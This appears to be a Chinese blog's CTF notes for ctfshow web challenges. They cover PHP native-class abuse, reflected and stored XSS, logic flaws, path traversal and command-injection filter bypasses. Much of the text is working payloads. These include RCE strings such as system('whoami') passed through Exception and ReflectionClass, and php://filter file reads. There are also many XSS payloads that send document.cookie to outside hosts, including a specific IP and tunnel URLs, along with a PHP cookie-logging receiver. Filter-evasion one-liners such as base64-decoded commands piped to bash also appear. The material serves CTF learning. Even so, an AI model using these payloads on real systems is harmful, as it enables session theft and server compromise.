<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">getcwd</span>().PHP_EOL;</span><br><span class="line">	<span class="keyword">echo</span> <span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="string">&#x27;./&#x27;</span>).PHP_EOL;</span><br><span class="line">	<span class="keyword">echo</span> <span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="title function_ invoke__">getcwd</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&gt;&gt;D:\PHP</span><br><span class="line">  index.php</span><br><span class="line">  index.php</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/Xxy605/article/details/110128544">(11条消息) CTF技巧_Web——PHP特性_使用文件系统迭代器FilesystemIterator和getcwd()查看当前目录下的文件结构_Ho1aAs的博客-CSDN博客</a></p>
<h2 id="GLOBALS全局变量"><a href="#GLOBALS全局变量" class="headerlink" title="$GLOBALS全局变量"></a>$GLOBALS全局变量</h2><p>从 PHP 8.1.0 起，不再支持对整个 $GLOBALS 数组的写访问：</p>
<p>$GLOBALS -引用全局作用域中可用的全部变量</p>
<p>一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function getFlag(&amp;$v1,&amp;$v2)&#123;</span><br><span class="line">    eval(&quot;$$v1 = &amp;$$v2;&quot;);</span><br><span class="line">    var_dump($$v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a href="https://www.php.net/manual/zh/reserved.variables.globals.php">PHP: $GLOBALS - Manual</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$$v1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="title function_ invoke__">getFlag</span>(<span class="variable">$v1</span>,<span class="variable">$v2</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>payload:</p>
<p>?v2&#x3D;GLOBALS&amp;v1&#x3D;ctfshow</p>
<h2 id="phpfuzz"><a href="#phpfuzz" class="headerlink" title="phpfuzz"></a>phpfuzz</h2><p>web115</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function filter($num)&#123;</span><br><span class="line">    $num=str_replace(&quot;0x&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;0&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;.&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;e&quot;,&quot;1&quot;,$num);</span><br><span class="line">    $num=str_replace(&quot;+&quot;,&quot;1&quot;,$num);</span><br><span class="line">    return $num;</span><br><span class="line">&#125;</span><br><span class="line">$num=$_GET[&#x27;num&#x27;];</span><br><span class="line">if(is_numeric($num) and $num!==&#x27;36&#x27; and trim($num)!==&#x27;36&#x27; and filter($num)==&#x27;36&#x27;)&#123;</span><br><span class="line">    if($num==&#x27;36&#x27;)&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;hacker!!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;hacker!!!&quot;;</span><br><span class="line">&#125; hacker!!!</span><br></pre></td></tr></table></figure>

<p>fuzz脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">for($i = 0; $i&lt;129; $i++)&#123;</span><br><span class="line">	$num=chr($i).&#x27;36&#x27;;</span><br><span class="line">	if(trim($num)!==&#x27;36&#x27; &amp;&amp; is_numeric($num) &amp;&amp; $num!==&#x27;36&#x27;)&#123;</span><br><span class="line">		echo urlencode(chr($i)).&quot;\n&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="静态类调用"><a href="#静态类调用" class="headerlink" title="静态类调用"></a>静态类调用</h2><p>​         web137 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class ctfshow</span><br><span class="line">&#123;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        die(&quot;private class&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    static function getFlag()&#123;</span><br><span class="line">        echo file_get_contents(&quot;flag.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">call_user_func($_POST[&#x27;ctfshow&#x27;]);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>php中 -&gt;与:: 调用类中的成员的区别<br>-&gt;用于动态语境处理某个类的某个实例<br>::可以调用一个静态的、不依赖于其他初始化的类方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ctfshow=ctfshow::getFlag</span><br></pre></td></tr></table></figure>

<p><strong>在PHP中，0&#x3D;&#x3D;&#x3D;FALSE是错误的</strong> 不是强等于</p>
<p>stripos() 函数查找字符串在另一字符串中第一次出现的位置</p>
<p>preg_match不识别数组</p>
<p>stripos()函数对数组不识别，遇到数组会返回false</p>
<h2 id="绕过return的方式"><a href="#绕过return的方式" class="headerlink" title="绕过return的方式"></a>绕过return的方式</h2><p>php中有个有意思的地方，数字是可以和命令进行一些运算的，例如 <code>1-phpinfo();</code>结合减号是可以执行phpinfo()命令的。（不一定是减号，还有加、乘、除号，若用加号。要用<code>+</code>，要进行URL编码，这是个特殊字符，不进行编码会当作空格）</p>
<h2 id="php原生类利用"><a href="#php原生类利用" class="headerlink" title="php原生类利用"></a>php原生类利用</h2><h3 id="报错类"><a href="#报错类" class="headerlink" title="报错类"></a>报错类</h3><h3 id="Error"><a href="#Error" class="headerlink" title="Error"></a>Error</h3><p>在PHP7版本中，因为Error中带有<code>__toString</code>方法，该方法会将传入给<code>__toString</code>的参数原封不动的输出到浏览器。在这么一个过程中可能会产生XSS。</p>
<p>我们来随便弄一个DEMO试试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php</span><br><span class="line">$a=$_GET[&#x27;a&#x27;];</span><br><span class="line">$b=$_GET[&#x27;b&#x27;];</span><br><span class="line">echo new $a($b);</span><br></pre></td></tr></table></figure>

<p>ERROR类中自动带有tostring魔术方法，我们如果这里把他当字符串输出，会自动触发tostring方法，如果这里是echo，即可造成XSS</p>
<p>Payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">http://127.0.0.1/?a=Error&amp;b=&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>



<h3 id="Exception"><a href="#Exception" class="headerlink" title="Exception"></a>Exception</h3><p>和Error类一样，也自带tostring方法，也可以造成XSS</p>
<p>既然如此，可以会被PHP执行，我们可以换一种写法，用eval()函数让他造成RCE即可在实战中使用</p>
<p>DEMO:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php</span><br><span class="line">$a=$_GET[&#x27;a&#x27;];</span><br><span class="line">$b=$_GET[&#x27;b&#x27;];</span><br><span class="line">eval(&quot;echo new $a($b);&quot;);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">?a=Exception&amp;b=system(&quot;whoami&quot;)</span><br></pre></td></tr></table></figure>

<p>因为echo new $a($b);会输出system(“whoami”)，然后会被eval放入代码中去执行，即可造成RCE</p>
<h3 id="遍历目录类"><a href="#遍历目录类" class="headerlink" title="遍历目录类"></a>遍历目录类</h3><h4 id="DirectoryIterator"><a href="#DirectoryIterator" class="headerlink" title="DirectoryIterator"></a>DirectoryIterator</h4><p>DirectoryIterator类中有一个__construct()方法，他会构造一个迭代器，如果使用echo进行输出，他会返回迭代器的第一个</p>
<p>demo:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php</span><br><span class="line">$a=$_GET[&#x27;a&#x27;];</span><br><span class="line">$b=$_GET[&#x27;b&#x27;];</span><br><span class="line">echo new $a($b);</span><br></pre></td></tr></table></figure>

<p>我们这时候如果传入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">?a=DirectoryIterator&amp;b=.</span><br></pre></td></tr></table></figure>

<p>此时是遍历当前目录，他回返回第一项，也就应该是一个点</p>
<p>有的师傅就说了，这有个勾八用，我们其实还可以使用glob:&#x2F;&#x2F;协议进行匹配其余的文件</p>
<p>例如:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">?a=DirectoryIterator&amp;b=glob://flag*</span><br></pre></td></tr></table></figure>

<p>这里的*依旧是通配符，就会匹配当前目录下的带有flag的文件</p>
<p>这里如果不知道文件名，可以直接暴力搜索，使用正则匹配去使用</p>
<p>例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">?a=DirectoryIterator&amp;b=glob://f[a-z]*</span><br></pre></td></tr></table></figure>



<h4 id="FilesystemIterator"><a href="#FilesystemIterator" class="headerlink" title="FilesystemIterator"></a>FilesystemIterator</h4><p>和Directorylterator差不多，不重复赘述</p>
<h4 id="GlobIterator"><a href="#GlobIterator" class="headerlink" title="GlobIterator"></a>GlobIterator</h4><p>GlobIterator和另外两个类差不多，不过glob是GlobIterator类本身自带的，因此在遍历的时候，就不需要带上glob协议头了，只需要后面的相关内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">?a=GlobIterator&amp;b=f[a-z]*</span><br></pre></td></tr></table></figure>

<h3 id="读取文件类"><a href="#读取文件类" class="headerlink" title="读取文件类"></a>读取文件类</h3><h4 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a>SplFileObject</h4><p>SplFileObject类为文件提供了一个面向对象接口，也就是这个类可以用来读文件</p>
<p>DEMO:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php</span><br><span class="line">$a = $_GET[&#x27;a&#x27;];</span><br><span class="line">$b = $_GET[&#x27;b&#x27;];</span><br><span class="line">echo new $a($b);</span><br></pre></td></tr></table></figure>

<p>我们传入?a&#x3D;SplFileObject&amp;b&#x3D;flag.php，即可读取我们flag.php里面的内容，但是他只能读一行！！！red</p>
<p>除了直接传文件名之外，我们是不是可以联系到php伪协议呢？不妨来试试，传入如下payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">?a=SplFileObject&amp;b=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>



<h3 id="反射类"><a href="#反射类" class="headerlink" title="反射类"></a>反射类</h3><h4 id="ReflectionClass"><a href="#ReflectionClass" class="headerlink" title="ReflectionClass"></a>ReflectionClass</h4><p>ReflectionClass反射类在PHP5新加入，继承自Reflector，它可以与已定义的类建立映射关系，通过反射类可以对类操作</p>
<p>反射类不仅仅可以建立对类的映射，也可以<strong>建立对PHP基本方法的映射</strong>，并且返回基本方法执行的情况。因此可以通过建立反射类<code>new ReflectionClass(system(&#39;cmd&#39;))</code>来执行命令</p>
<p>这里我们直接使用CTFshow的web109来作为例题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP</span><br><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">/* </span><br><span class="line"># -*- coding: utf-8 -*- </span><br><span class="line"># @Author: h1xa </span><br><span class="line"># @Date:   2020-09-16 11:25:09 </span><br><span class="line"># @Last Modified by:   h1xa </span><br><span class="line"># @Last Modified time: 2020-09-29 22:02:34 </span><br><span class="line"></span><br><span class="line">*/ </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__); </span><br><span class="line">error_reporting(0); </span><br><span class="line">if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123; </span><br><span class="line">    $v1 = $_GET[&#x27;v1&#x27;]; </span><br><span class="line">    $v2 = $_GET[&#x27;v2&#x27;]; </span><br><span class="line"></span><br><span class="line">    if(preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v1) &amp;&amp; preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v2))&#123; </span><br><span class="line">            eval(&quot;echo new $v1($v2());&quot;); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p>已知了flag在<code>./fl36dg.txt</code>，命令执行<code>system(‘cat fl36dg.txt’)</code>获取flag，所以应该传入如下参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PLAINTEXT</span><br><span class="line">v1=ReflectionClass&amp;v2=system(&quot;ls&quot;)</span><br></pre></td></tr></table></figure>



<h4 id="ReflectionMethod"><a href="#ReflectionMethod" class="headerlink" title="ReflectionMethod"></a>ReflectionMethod</h4><p>和ReflectionClass一样，直接上图</p>
<p><code>Typecho_Db_Exception</code>类在&#x2F;var&#x2F;Typecho&#x2F;Db&#x2F;Query.php中，这里有一个<code>//__toString()</code>的注释，直接看__toString函数里的内容</p>
]]></content>
  </entry>
  <entry>
    <title>ctfshowxss</title>
    <url>/2023/02/26/ctfshow%E5%90%88%E9%9B%86-xss/</url>
    <content><![CDATA[<p> xss</p>
<span id="more"></span>

<p>反射型XSS大多数是用来盗取用户的Cookie信息。</p>
<h1 id="web316-326（反射型）"><a href="#web316-326（反射型）" class="headerlink" title="web316-326（反射型）"></a>web316-326（反射型）</h1><p>在本地建一个网站代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>, <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload:</p>
<p>21232f297a57a5a743894a0e4a801fc3</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;document.location.href=&#x27;http://101.43.182.125:7000/&#x27;+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<script type="text/javascript">window.location.href="http://node5.anna.nssctf.cn:28885/flag";</script>

<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;自己网站ip?cookie=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>即可在自己网站生成一个cookie.txt文档即是flag</p>
<p>flag&#x3D;ctfshow{cbc17e98-ce5c-42a6-90f1-a2a5fb0bc724}</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;http://你的公网ip:端口号/&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="keyword">var</span> img = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;img&quot;</span>);img.<span class="property">src</span> = <span class="string">&quot;http://你的公网ip:端口号/?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://你的公网ip:端口号/&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">location.<span class="property">href</span>=<span class="string">&#x27;http://你的公网ip:端口号/&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line">&lt;input onfocus=&quot;window.open(&#x27;http://你的公网ip:端口号/&#x27;+document.cookie)&quot; autofocus&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg onload=&quot;window.open(&#x27;http://你的公网ip:端口号/&#x27;+document.cookie)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe onload=&quot;window.open(&#x27;http://你的公网ip:端口号/&#x27;+document.cookie)&quot;&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;body onload=&quot;window.open(&#x27;http://你的公网ip:端口号/&#x27;+document.cookie)&quot;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="web320-326"><a href="#web320-326" class="headerlink" title="web320-326"></a>web320-326</h3><p>过滤空格    &#x2F;**&#x2F;<br> payload语句</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;body/onload=<span class="string">&quot;window.location.href=&#x27;http://fe6e643.cpolar.top/2.php?c=&#x27;+document.cookie&quot;</span>&gt;</span><br></pre></td></tr></table></figure>

<h3 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;https://16d59916.cpolar.cn/test.php?cookie=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h2 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h2><p>每一次管理员的cookie会改变，所以无法使用上述的方式去获得cookie,,方法暂无</p>
<p>一、存储型XSS简介<br>（一）存储型XSS的概念<br>存储型XSS又称持久型XSS，攻击脚本将被永久地存放在目标服务器的数据库或文件中，具有很高的隐蔽性。反射型XSS的被攻击对象一般是攻击者去寻找的，就比如说：一个攻击者想盗取A的账号，那么攻击者就可以将一个含有反射型XSS的特制URL链接发送给A，然后用花言巧语诱骗A点击链接。当A不小心点进去时，就会立即受到XSS攻击。这种攻击方式需要一点骗术，所以这种攻击范围不是特别的广，并且提交漏洞时要么平台不认，要么会被认定为低危漏洞。<br>存储型XSS可以采用广撒网的方式，就是攻击者将存储型XSS代码写进一些有XSS漏洞的网站上，只要有用户访问这个链接就会自动中招。所以我们可以看出，存储型XSS的危害性更大，范围更广，可以不需要寻找被攻击对象，只要存储型XSS在服务器上就能实施攻击。所以提交的存储型XSS评级一般为中危漏洞。</p>
<p>（二）存储型XSS攻击过程<br>这种攻击多见于论坛、博客和留言板。攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久地被存放在服务器的后端数据库中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在他们的浏览器中得到触发。<br>例如，攻击者在留言板中加入以下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>这样当其他用户访问留言板时，就会看到一个弹窗。可以看到，存储型XSS的攻击方式能够将恶意代码永久地存入数据库或者文件中，相当于将代码嵌入一个页面中，所有访问这个页面的用户都将成为受害者。如果我们能够谨慎对待不明链接，那么反射型XSS攻击将没有多大作为，而存储型XSS则不同，由于它注入在一些我们非常信任的页面中，因此无论我们多么小心，都难免会受到攻击。</p>
<h2 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h2><p>发现一个修改密码的界面</p>
<p>自己随便注册一个账号，修改密码，抓包看见</p>
<p>GET &#x2F;api&#x2F;change.php?p&#x3D;qwe HTTP&#x2F;1.1</p>
<p>用下面这句话作为账号密码注册一个账号</p>
<script>window.open('http://127.0.0.1/api/change.php?p=123')</script>

<p>admin 123登录打开抓包看response用户管理即可发现flag，要用抓包，不然会重定向，看不到这个。可以从response中看到flag</p>
<h2 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h2><h2 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h2><p>逻辑漏洞转账负数金额即可-100000要是支付宝有这个漏洞就好了</p>
<p>购买flag</p>
<h2 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h2><p>不能转负数了但是可以给自己转，bp爆破一下吧，payload set 1;</p>
<p>payloadtype number;</p>
<p>from 4  to 1000;</p>
<p>刷新看到有钱买flag</p>
]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>中期测评</title>
    <url>/2023/04/29/ctfshow%E5%90%88%E9%9B%86-%E4%B8%AD%E6%9C%9F%E6%B5%8B%E8%AF%84/</url>
    <content><![CDATA[<p> 中期测评</p>
  <span id="more"></span>

<h2 id="web486"><a href="#web486" class="headerlink" title="web486"></a>web486</h2><p>文件包含，目录穿越漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://5a6eadf3-e230-45ef-84bf-d4049f8efdff.challenge.ctf.show/index.php?action=../flag</span><br></pre></td></tr></table></figure>

<p>查看源码</p>
<h2 id="web487"><a href="#web487" class="headerlink" title="web487"></a>web487</h2>]]></content>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>命令执行技巧</title>
    <url>/2023/01/09/ctfshow%E5%90%88%E9%9B%86-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<p>php的include可以载入一个外部php文件，其参数是一个文件名，既然是文件名，就不能带参数了。</p>
<p>php中，如果include载入的文件一定要带参数，就只有一种办法，即这个参数是一个全路径的URL地址。</p>
<span id="more"></span>

<p>windows 下</p>
<blockquote>
<p><code>|</code>直接执行后面的语句<br><code>||</code>如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br><code>&amp;</code>前面和后面命令都要执行，无论前面真假<br><code>&amp;&amp;</code>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>
</blockquote>
<p>Linux 下</p>
<blockquote>
<p><code>;</code>前面和后面命令都要执行，无论前面真假<br><code>|</code>直接执行后面的语句<br><code>||</code>如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句<br><code>&amp;</code>前面和后面命令都要执行，无论前面真假<br><code>&amp;&amp;</code>如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令</p>
<h1 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h1><blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;` `&lt;` `&lt;&gt;` 重定向符</span><br><span class="line">`%09`(需要php环境)</span><br><span class="line">`$&#123;IFS&#125;`</span><br><span class="line">`$IFS$9` //$1改成$加其他数字貌似都行</span><br><span class="line">`&#123;cat,flag.php&#125;` //用逗号实现了空格功能</span><br><span class="line">`%20`</span><br><span class="line">`%09</span><br></pre></td></tr></table></figure>
</blockquote>
</blockquote>
<p>执行代码函数</p>
<p><code>eval()</code><br><code>assert()</code><br><code>preg_replace()</code><br><code>create_function()</code><br><code>array_map()</code><br><code>call_user_func()</code><br><code>call_user_func_array()</code><br><code>array_filter</code><br><code>usort</code><br><code>uasort()</code></p>
<p>${}:中间的php代码将会被解析</p>
<p>命令执行函数</p>
<p>system()<br>exec()<br>shell_exec()<br>passthru()<br>pcntl_exec()<br>popen()<br>proc_open()</p>
<p>PHP 支持一个执行运算符：反引号（&#96;）。注意这不是单引号！PHP    将尝试将反引号中的内容作为 shell 命令来执行，并将其输出信息返回（即，可以赋给一个变量而不是简单地丢弃到标准输出）。使用反引号运算符“”的效果与函数    shell_exec() 相同。</p>
<ul>
<li><p>文件包含函数：</p>
<p>require<br>include<br>require_ once<br>include once</p>
<p>文件读取函数：</p>
<p>copy<br>file_get_contents()<br>highlight_file()<br>fopen()<br>read file()<br>fread()<br>fgetss()<br>fgets()<br>parse_ini_file()<br>show_source()<br>file()</p>
</li>
</ul>
<h1 id="cat被过滤"><a href="#cat被过滤" class="headerlink" title="cat被过滤"></a>cat被过滤</h1><blockquote>
<p>more:一页一页的显示档案内容<br>less:与 more 类似<br>head:查看头几行<br>tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br>tail:查看尾几行<br>nl：显示的时候，顺便输出行号<br>od:以二进制的方式读取档案内容<br>vi:一种编辑器，这个也可以查看<br>vim:一种编辑器，这个也可以查看<br>sort:可以查看<br>uniq:   &#x2F;&#x2F; uniq 命令用于检查及删除文本文件中重复出现的行列<br>file -f:报错出具体内容</p>
<h1 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h1><p>拼接</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=c;b=at;c=fl;d=ag;$a$b $c$d</span><br></pre></td></tr></table></figure>
</blockquote>
<p>base64编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bash //cat flag</span><br><span class="line">echo &quot;Y2F0IC9mbGFn&quot;|base64 -d|bash   //cat /flag</span><br></pre></td></tr></table></figure>

<p>情况下可尝试sh)</p>
<p>单引号、双引号</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c&quot;&quot;at fl&#x27;&#x27;ag</span><br></pre></td></tr></table></figure>
</blockquote>
<p>反斜线</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c\at fl\ag</span><br></pre></td></tr></table></figure>
</blockquote>
<p>正则 (假设&#x2F;bin&#x2F;cat: test: 是一个目录)</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/???/?[a][t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;`</span><br><span class="line">`/???/?at ????`</span><br><span class="line">`/???/?[a]&#x27;&#x27;[t] ?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;?&#x27;&#x27;</span><br></pre></td></tr></table></figure>
</blockquote>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat `ls` #查看当前目录的所有文件的内容。</span><br><span class="line"></span><br><span class="line">cat *     #查看当前目录的所有文件的内容。</span><br></pre></td></tr></table></figure>

